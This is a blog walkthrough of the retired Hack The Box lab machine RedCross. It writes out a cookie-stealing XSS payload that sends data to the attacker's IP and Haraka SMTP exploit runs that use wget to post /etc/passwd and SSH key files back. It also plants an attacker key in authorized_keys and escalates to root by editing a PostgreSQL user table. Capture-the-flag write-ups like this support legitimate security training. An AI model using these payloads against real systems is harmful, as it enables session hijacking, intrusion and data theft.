---
published: true
layout: post
author: jake
date: '2019-04-14 00:00:01 UTC'
tags: htb walkthrough redcross
---
This week we are taking a look at the retired Hack The Box machine [RedCross](https://www.hackthebox.eu/home/machines/profile/162) (Medium difficulty)

Start with Nmap:
```
root@kali: nmap -sC -sV -oN nmap 10.10.10.113
# Nmap 7.70 scan initiated Mon Nov 12 17:06:14 2018 as: nmap -sC -sV -oN nmap 10.10.10.113
Nmap scan report for 10.10.10.113
Host is up (0.23s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
| ssh-hostkey: 
|   2048 67:d3:85:f8:ee:b8:06:23:59:d7:75:8e:a2:37:d0:a6 (RSA)
|   256 89:b4:65:27:1f:93:72:1a:bc:e3:22:70:90:db:35:96 (ECDSA)
|_  256 66:bd:a1:1c:32:74:32:e2:e6:64:e8:a5:25:1b:4d:67 (ED25519)
80/tcp  open  http     Apache httpd 2.4.25
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Did not follow redirect to https://intra.redcross.htb/
443/tcp open  ssl/http Apache httpd 2.4.25
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=intra.redcross.htb/organizationName=Red Cross International/stateOrProvinceName=NY/countryName=US
| Not valid before: 2018-06-03T19:46:58
|_Not valid after:  2021-02-27T19:46:58
|_ssl-date: ERROR: Script execution failed (use -d to debug)
| tls-alpn: 
|   http/1.1
[...]
|_  http/1.1
Service Info: Host: redcross.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov 12 17:26:42 2018 -- 1 IP address (1 host up) scanned in 1228.46 seconds
```
Browsing to the website we can see that it tries to redirect to https://intra.redcross.htb so we add that to our `/etc/hosts` file, for good measure we also add `redcross.htb`.

The site loads up and we can see a login page:
![238682117.png]({{site.baseurl}}/Images/RedCross/238682117.png)

Before we go any further we take a look for files and directories with gobuster:
```
root@kali: gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 75 -u https://intra.redcross.htb -o gobuster.log -k
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : https://intra.redcross.htb/
[+] Threads      : 75
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/04/16 08:34:19 Starting gobuster
=====================================================
/images (Status: 301)
/pages (Status: 301)
/documentation (Status: 301)
/javascript (Status: 301)
...
```

Here we have to add the `-k`argument to ignore certificate errors because the intra site is using https with a self-signed certificate.

While that runs we start guessing some default credentials we eventually see that `guest:guest` works.

Nothing useful when logged in as guest, we ran wfuzz against the query strings and sqlmap against the login, contact and messages forms, there was a help file that told you how to request access through the contact form, but following it does not result in any additional information we didn't already know.

We spent a lot of time messing around with different wfuzz and sqlmap as well as manual sql injection, we were able to use sql injection to get data from the site, but we really wanted to get full admin access so we kept pushing.

Playing around with the contact form, there appears to be XSS protection added to the details input, but not the other fields.

When adding some XSS test characters (`<>$="".`)into the details imput we get the following error message:
![238944273.png]({{site.baseurl}}/Images/RedCross/238944273.png)

However when we add the same to the phone number field, we get a contact form submitted message. 

We can set up a very basic XSS script to see if it is something that will be triggered by a user that might be checking the contact form requests:
```
<script>document.write('<img src="http://10.10.14.12/ThoseGuys.gif?cookie='+document.cookie+'"/>')</script>
```

The code above will try to embed an image on the page, but we are telling it to get the image from our attackers machine, and passing a JavaScript variable as a query string parameter. In this example we are seeing if we can steal the cookie of whoever is reading the contact request. The reason we use the `<img` tag is because we want the javascript to trigger as soon as the page loads, so that it triggers without needing to further trick a target into clicking a link or interacting with a particular element. 
What happens is, when the user loads up the page, it is attempting to load a image that doesn't exist (or it could if we actually hosted one) with the added query string containing the value of the users cookie javascript variable, our web server hosting the image gets the full request URL, including query strings, so we are able to potentially steal the targets authentication cookie / session.

To see the contents of the variable we have to host a server using our friend SimpleHTTPServer:
```
root@kali: python -m SimpleHTTPServer 80
```
Once we have the web server listening, place the XSS script into the contact phone field and submit the form:
![217972750.png]({{site.baseurl}}/Images/RedCross/217972750.png)

Once the form submits, looking back at our web server we can see that we have a call back with someones cookie:
```
root@kali: python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.113 - - [23/Nov/2018 08:59:48] code 404, message File not found
10.10.10.113 - - [23/Nov/2018 08:59:48] "GET /ThoseGuys.gif?cookie=PHPSESSID=ak3oeagb7ph0fq8lusbjcenli2;%20LANG=EN_US;%20SINCE=1555369540;%20LIMIT=10;%20DOMAIN=admin HTTP/1.1" 404 -
```

Great! Looks like we have received a cookie with a heap of data, including a `PHPSESSID`, we can use this value to hijack this users session. Back in our browser we can add and edit cookies with the default browser dev tools or any other add-on.

Open the dev tools (F12) navigate to the Storage tab and find cookies on the left. Once there add the values from the stolen cookie as rows and refresh the page:
![238944293.png]({{site.baseurl}}/Images/RedCross/238944293.png)

It looks like at a minimum you will also need to add the `LIMIT=10` value if you're not already logged in as guest, this is the method for sqlinjection if you would like to explore that.

Refreshing the page we can see that we are now logged in as the admin user! 

Reading through the posts we can see that there might also be an admin url. Lets add that to our hosts file as well and navigate there https://admin.redcross.htb

Trying the same thing and reusing the cookie we also gain access to that site:
![238747670.png]({{site.baseurl}}/Images/RedCross/238747670.png)

First we look at the User Management page, looks like it is allowing us to create a user! Adding a user it looks like it automatically generates some credentials for us:
![221872132.png]({{site.baseurl}}/Images/RedCross/221872132.png)

Our nmap scans showed that the box has SSH open on port 22, now that we have some credentials lets try them and see if we can connect:
![221937671.png]({{site.baseurl}}/Images/RedCross/221937671.png)

It worked! Time to enumerate around and see what we have access to. Because it looks like we are in a `/bin/sh` shell, we can upgrade it by running `bash`.

Trying our usual enumeration methods we can see that the `/etc/passwd` file does not quite look right and we are unable to look at running process or listening ports:
![222003207.png]({{site.baseurl}}/Images/RedCross/222003207.png)

Looks like we are in a jail or restricted shell. We still have another page on the admin website that we haven't looked at yet, so let's head back there and see if it can help us escape the jail.

The webpage wants an IP address and looks like it adds it to a firewall whitelist. When we add our IP address and press the Allow IP button we get a message:
```
DEBUG: All checks passed... Executing iptables Network access granted to 10.10.14.12 
```

The site redirects us back to the whitelist page and we can see our IP added:
![222003212.png]({{site.baseurl}}/Images/RedCross/222003212.png)

We can try validation bypasses to try and command chain, but it doesn't look like there is anything we can do there.

The message did say that we now have network access, so lets go back to the start and enumerate as if it was a new machine.
```
root@kali: nmap -sC -sV -oN nmap-whitelist 10.10.10.113
# Nmap 7.70 scan initiated Mon Nov 12 20:08:33 2018 as: nmap -sC -sV -oN nmap-whitelist 10.10.10.113
Nmap scan report for intra.redcross.htb (10.10.10.113)
Host is up (0.23s latency).
Scanned at 2018-11-12 20:08:33 AEDT for 66s

PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
| ssh-hostkey: 
|   2048 67:d3:85:f8:ee:b8:06:23:59:d7:75:8e:a2:37:d0:a6 (RSA)
|   256 89:b4:65:27:1f:93:72:1a:bc:e3:22:70:90:db:35:96 (ECDSA)
|_  256 66:bd:a1:1c:32:74:32:e2:e6:64:e8:a5:25:1b:4d:67 (ED25519)
80/tcp   open  http
|_http-title: Did not follow redirect to https://intra.redcross.htb/
443/tcp  open  https
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|       secure flag not set and HTTPS in use
|_      httponly flag not set
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was /?page=login
| ssl-cert: Subject: commonName=intra.redcross.htb/organizationName=Red Cross International/stateOrProvinceName=NY/countryName=US
| Not valid before: 2018-06-03T19:46:58
|_Not valid after:  2021-02-27T19:46:58
|_ssl-date: ERROR: Script execution failed (use -d to debug)
| tls-alpn: 
|   http/1.1
...
|_  http/1.1
1025/tcp open  NFS-or-IIS
5432/tcp open  postgresql
| ssl-cert: Subject: commonName=redcross.redcross.htb
| Subject Alternative Name: DNS:redcross.redcross.htb
| Not valid before: 2018-06-03T19:13:20
|_Not valid after:  2028-05-31T19:13:20
|_ssl-date: ERROR: Script execution failed (use -d to debug)
```

Comparing these results with our initial scan we can see that we now have ports 1025 and 5432 open.

Nmap is able to detect that port 5432 is Postgresql but does not know what 1025 is. To find out for ourselves we connect to that port using telnet
```
root@kali: telnet 10.10.10.113 1025
Trying 10.10.10.113...
Connected to 10.10.10.113.
Escape character is '^]'.
220 redcross ESMTP Haraka 2.8.8 ready
```


Looks like it is an SMTP server. we use searchsploit with the SMTP software to see if there are any exploits:
```
root@kali: searchsploit Haraka                                                                   
------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                   |  Path
                                                                                                 | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------------- ----------------------------------------
Haraka < 2.8.9 - Remote Command 																 | exploits/linux/remote/41162.py
------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
Papers: No Result
```

Lucky for us there is one exploit and our version is supported!

Copy the exploit to our current working directory with `searchsploit -m exploits/linux/remote/41162.py`

Looking through the code, all we need to change is the SMTP port on line 123:
```
    s = smtplib.SMTP(mailserver,1025)
```

running the exploit and looking at the help text:
```
root@kali: python 41162.py -h                                                                 
##     ##    ###    ########     ###    ##    ## #### ########  #### 
##     ##   ## ##   ##     ##   ## ##   ##   ##   ##  ##     ##  ##  
##     ##  ##   ##  ##     ##  ##   ##  ##  ##    ##  ##     ##  ##  
######### ##     ## ########  ##     ## #####     ##  ########   ##  
##     ## ######### ##   ##   ######### ##  ##    ##  ##   ##    ##  
##     ## ##     ## ##    ##  ##     ## ##   ##   ##  ##    ##   ##  
##     ## ##     ## ##     ## ##     ## ##    ## #### ##     ## #### 
                                                 
-o- by Xychix, 26 January 2017 ---
-o- xychix [at] hotmail.com ---
-o- exploit haraka node.js mailserver <= 2.8.8 (with attachment plugin activated) --

-i- info: https://github.com/haraka/Haraka/pull/1606 (the change that fixed this)

usage: 41162.py [-h] -c CMD -t TO -m MAILSERVER [-f FROM]

Harakiri

optional arguments:
  -h, --help            show this help message and exit
  -c CMD, --cmd CMD     command to run
  -t TO, --to TO        victim email, mx record must point to vulnerable
                        server
  -m MAILSERVER, --mailserver MAILSERVER
                        mailserver to talk to, you can consider putting the
                        vuln server here if the mx records aren't correct
  -f FROM, --from FROM  optional: From email address
```

From this we are able to construct all the arguments we need to run a test command.
```
root@kali: python 41162.py -c 'cat /etc/passwd' -t thoseguys@redcross.htb -m redcross.htb
##     ##    ###    ########     ###    ##    ## #### ########  #### 
##     ##   ## ##   ##     ##   ## ##   ##   ##   ##  ##     ##  ##  
##     ##  ##   ##  ##     ##  ##   ##  ##  ##    ##  ##     ##  ##  
######### ##     ## ########  ##     ## #####     ##  ########   ##  
##     ## ######### ##   ##   ######### ##  ##    ##  ##   ##    ##  
##     ## ##     ## ##    ##  ##     ## ##   ##   ##  ##    ##   ##  
##     ## ##     ## ##     ## ##     ## ##    ## #### ##     ## #### 
                                                 
-o- by Xychix, 26 January 2017 ---
-o- xychix [at] hotmail.com ---
-o- exploit haraka node.js mailserver <= 2.8.8 (with attachment plugin activated) --

-i- info: https://github.com/haraka/Haraka/pull/1606 (the change that fixed this)

Send harariki to thoseguys@redcross.htb, attachment saved as harakiri-20181212-103434.zip, commandline: cat /etc/passwd , mailserver redcross.htb is used for delivery
Content-Type: multipart/mixed; boundary="===============1419915672=="
MIME-Version: 1.0
Subject: harakiri
From: harakiri@exploit.db
To: thoseguys@redcross.htb

--===============1419915672==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit

harakiri
--===============1419915672==
Content-Type: application/octet-stream; Name="harakiri.zip"
MIME-Version: 1.0
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="harakiri.zip"

UEsDBBQAAAAIAFFUjE1wUAUkbAEAAI0BAAAeAAAAYSI7Y2F0IC9ldGMvcGFzc3dkO2VjaG8gImEu
emlwC/BmZhFhYGDgYAgM6fEVX9agLszIwMDOzMDAAxTNSCxKzM4sytQrqSiZGng6r9lAYM9vbbdH
kzxMVWQyRLZ+XxUfsPJVIjNf2SnvDUs+fH868QNX0NWpEuvL064n50RmHN5UtUc/NiFsd6J7Txdf
q+nMSxedj3vlNnQu+nskaf8yyUkXrz6esnvnxJm/5l5VW3t4rnic2Oc8g7W6e3pu35xSue3Lpx/x
1/b+mdubb7KXkeWftNMyoeVS8lvX+35luX7YWlX1qemdu/8kg075BZXa2HXuXxDcd9Jl2/xjzOtX
6XjxOgf73W9R4Z1Sq3nhFdfU+NC+6eE7vh20S/icHNE84+T1jV4SkSFtaow/c9Yd0bphFtw6we2Q
yvMvHGfniLof55y979MVuddfjlvk/500NfDJm71z23mzWeODhbQ2qB27GaKVERScc1Q/wJuRSYQB
d/DBQAMjA1pgBnizsoHEGIHQCkjbglUAAFBLAQIUABQAAAAIAFFUjE1wUAUkbAEAAI0BAAAeAAAA
AAAAAAAAAACAAQAAAABhIjtjYXQgL2V0Yy9wYXNzd2Q7ZWNobyAiYS56aXBQSwUGAAAAAAEAAQBM
AAAAqAEAAAAA
--===============1419915672==--

[HARAKIRI SUCCESS] SMTPDataError is most likely an error unzipping the archive, which is what we want [Error unpacking archive]
```

From the output, it doesn't look like we actually get to see the output of the command executed so we need to get a bit creative.

Set up a nc listener and use wget to post file contents back to ourselves. In one console window run `nc -nlvp 80` then in another console window run the exploit:
```
root@kali: python 41162.py -c 'wget --post-file=/etc/passwd http://10.10.14.12' -t thoseguys@redcross.htb -m redcross.htb
```

Once the exploit has finished executing we can see that our nc listener has received the contents of the file:
```
root@kali: nc -nlvp 80
listening on [any] 80 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.113] 41420
POST / HTTP/1.1
User-Agent: Wget/1.18 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.10.14.12
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 1968

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
rtkit:x:105:109:RealtimeKit,,,:/proc:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
lightdm:x:110:113:Light Display Manager:/var/lib/lightdm:/bin/false
pulse:x:111:114:PulseAudio daemon,,,:/var/run/pulse:/bin/false
avahi:x:112:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
saned:x:113:118::/var/lib/saned:/bin/false
penelope:x:1000:1000:Penelope,,,:/home/penelope:/bin/bash
vboxadd:x:999:1::/var/run/vboxadd:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
postgres:x:115:121:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
ftp:x:108:122:ftp daemon,,,:/srv/ftp:/bin/false
```

We can use the same technique to figure out what user we are logged in as and post it back to us with some command chaining:
```
root@kali: python 41162.py -c 'echo $(whoami) > /tmp/whoami; wget --post-file=/tmp/whoami http://10.10.14.12' -t thoseguys@redcross.htb -m redcross.htb
```

Back on our listener we get the result of what user we are running commands as:
```
root@kali: nc -nlvp 80
listening on [any] 80 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.113] 42054
POST / HTTP/1.1
User-Agent: Wget/1.18 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.10.14.12
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 9

penelope
```


The results show us that we are the penelope user. From here we could grab the `user.txt`, but we want to take it a step further and get something more interactive.

We know from the nmap scans that we have ssh on the box. We continue to use this technique to see if there are any default ssh files in the users home directory that might help us connect:
```
root@kali: python 41162.py -c 'wget --post-file=/home/penelope/.ssh/id_rsa http://10.10.14.12' -t thoseguys@redcross.htb -m redcross.htb
root@kali: python 41162.py -c 'wget --post-file=/home/penelope/.ssh/penelope http://10.10.14.12' -t thoseguys@redcross.htb -m redcross.htb
root@kali: python 41162.py -c 'wget --post-file=/home/penelope/.ssh/authorized_keys http://10.10.14.12' -t thoseguys@redcross.htb -m redcross.htb
```

We get a hit for the authorized_keys file, but it does not contain anything that helps us SSH in, but we can create our own SSH keys and replace the `authorized_keys` file with our own public key. On the attackers machine generate some keys without a password using:
```
root@kali: ssh-keygen -f thoseguys
...
root@kali: chmod 600 thoseguys; chmod 600 thoseguys.pub
```

Now use python SimpleHTTPServer and the wget exploit command to upload our public key and overwrite the current `authorized_keys`

In one terminal window create a basic web server with `python -m SimpleHTTPServer 80` and then run the exploit:
```
root@kali: python 41162.py -c 'wget http://10.10.14.12/thoseguys.pub -O /home/penelope/.ssh/authorized_keys' -t thoseguys@redcross.htb -m redcross.htb
```

Once the exploit finishes we should see in our SimpleHTTPServer output that our public key was downloaded and we are now able to ssh in as the penelope user with our private key:
```
root@kali: ssh -i thoseguys penelope@redcross.htb
```

Now we are on the box as penelope and can read the `user.txt` flag.

Poking around the box, there is nothing new or interesting running, or listening and we cannot run sudo without knowing penelopes password, so we move on to the looking at the source code for the web application we find a lot of different credentials for the postgresql server.
```
penelope@redcross: grep -rnw '/var/www/html' -e 'password'
/var/www/html/admin/pages/login.php:7:echo "<tr><td align='right'>Password</td><td><input type='password' name='pass'></input></td></tr>";
/var/www/html/admin/pages/firewall.php:7:	$dbconn = pg_connect("host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa&");
/var/www/html/admin/pages/users.php:7:	$dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixnss password=fios@ew023xnw");
/var/www/html/admin/pages/actions.php:32:	$sql=$mysqli->prepare("SELECT id, password, mail, role FROM users WHERE username = ?");
/var/www/html/admin/pages/actions.php:95:	$dbconn = pg_connect("host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa&");
/var/www/html/admin/pages/actions.php:109:	$dbconn = pg_connect("host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa&");
/var/www/html/admin/pages/actions.php:118:	$dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B&");
/var/www/html/admin/pages/actions.php:127:	$dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B&");
/var/www/html/intra/pages/login.php:7:echo "<tr><td align='right'>Password</td><td><input type='password' name='pass'></input></td></tr>";
/var/www/html/intra/pages/actions.php:27:	$sql=$mysqli->prepare("SELECT id, password, mail, role FROM users WHERE username = ?");
```

Trying to log into the postgresql server we finally get a credential set that works.
```
penelope@redcross: psql -h 127.0.0.1 -U unixusrmgr -W unix
Password for user unixusrmgr: dheu%7wjx8B&
unix-> \dt
            List of relations
 Schema |     Name     | Type  |  Owner   
--------+--------------+-------+----------
 public | group_table  | table | postgres
 public | passwd_table | table | postgres
 public | shadow_table | table | postgres
 public | usergroups   | table | postgres
(4 rows)
```

Use `\z` to view our users current permissions.

The only table we seem to be able to access is the `passwd_table`:
```
unix=> select * from passwd_table;
username | passwd | uid | gid | gecos | homedir | shell
-----------+------------------------------------+------+------+-------+----------------+-----------
tricia | $1$WFsH/kvS$5gAjMYSvbpZFNu//uMPmp. | 2018 | 1001 | | /var/jail/home | /bin/bash
thoseguys | $1$yWuH2ffu$W9XZ85gyIq9rcw/e5hwal0 | 2021 | 1001 | | /var/jail/home | /bin/bash
(2 rows)
```

We can see that this table contains the user we created in the admin site. If you are unfamiliar with linux groups and permissions. `cat /etc/group` and we can get a list of Linux groups. reading through the contents a group id (gid) of 27 will add a user into the sudoers group, allowing them to run sudo commands.

With this in mind we update our jailed user to be in the sudoers group:
```
unix=> update passwd_table set gid = '27' where username = 'thoseguys';
UPDATE 1
```

Once done, we can now go back and ssh into the box with our jailed user credentials and run the command sudo su to become root with our username and password:
```
root@kali: ssh thoseguys@redcross.htb                    
thoseguys@redcross.htb's password: 
Linux redcross 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Nov 12 20:11:40 2018 from 10.10.14.12
thoseguys@redcross:~$ sudo su

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for thoseguys: 
root@redcross:/var/jail/home# 
```

We can now read the `root.txt`.

We could take it a step further again and copy our `authorized_keys` file from penelope into the root folder and ssh in directly as the root user:
```
root@redcross: mkdir /root/.ssh
root@redcross: cp /home/penelope/.ssh/authorized_keys /root/.ssh/authorized_keys
root@redcross: chmod 600 /root/.ssh/authorized_keys
root@redcross: exit
thoseguys@redcross: exit

root@kali: ssh -i thoseguys root@redcross.htb
...
root@redcross: 
```

And there we have it, full root access to the box. This was a great into to some new skills to CTFs, it is rare to see one that includes an XSS vulnerability.
